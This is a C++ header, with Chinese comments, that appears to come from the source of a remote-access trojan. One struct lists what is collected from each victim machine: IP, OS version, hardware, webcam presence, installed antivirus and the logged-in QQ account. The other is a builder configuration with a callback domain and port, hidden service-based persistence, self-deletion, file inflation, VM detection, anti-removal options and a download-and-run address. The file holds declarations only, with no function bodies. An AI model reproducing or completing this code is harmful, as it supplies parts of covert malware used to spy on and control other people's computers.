#pragma once
#include "TCHAR.h"
#include "ClientSocket.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

typedef struct  _LOGIN_INFOR
{	
	
	BYTE			bToken;			// 取1，登陆信息
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			OsVerInfoEx[sizeof(OSVERSIONINFOEX)];// 版本信息
	DWORD			dwCPUMHz;		// CPU主频
	IN_ADDR			ClientAddr;		// 存储32位的IPv4的地址数据结构
	char			szPCName[MAX_PATH];	// 主机名
	BOOL			bWebCamIsExist;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	int				nCPUNumber;		// CPU核数
	DWORD			MemSize;		// 内存大小
	char			Virus[40];		// 杀毒软件
	char			szQQNum[32];	// 登陆QQ
	bool            bIsWow64;        //系统平台
	BOOL			bIsActive;	    // 用户状态
	char        sznet[20];      //net type
}LOGIN_INFOR,*PLOGIN_INFOR;

struct MODIFY_DATA
{
	TCHAR szDns[300];		//上线地址
	TCHAR dwPort[32];		//上线端口
	TCHAR szGroup[50];		//上线分组
	TCHAR szVersion[32];	//上线版本
	TCHAR szGetGroup[256];	//分组唯一标识
	BOOL  bRunOnce;         //是否为绿色安装
	BOOL  bRuns;            //是否是启动目录启动
	BOOL  bService;         //是否是服务启动
	TCHAR SerName[100];     //服务名称
	TCHAR Serdisplay[128];  //显示名称
	TCHAR Serdesc[256];     //服务描述
	TCHAR ReleasePath[100]; //安装途径
	TCHAR ReleaseName[50];  //安装名称
	WORD FileAttribute;      //文件属性
	BOOL  bLanPenetrate;    //超级复活
	CHAR Mexi[100];          //运行互斥
	WORD  Dele_zd;          //安装增大
	BOOL Dele_te;            //安装自删除
	BOOL Fvm;            //vm
	BOOL Dele_fs;            //占坑防删除安装
	BOOL Fhb;           //哈波
	BOOL Zjz;
	BOOL fsc;
	CHAR szDownRun[512];   //下载运行地址
};
int sendLoginInfo(CClientSocket* ClientObject,DWORD dwSpeed);

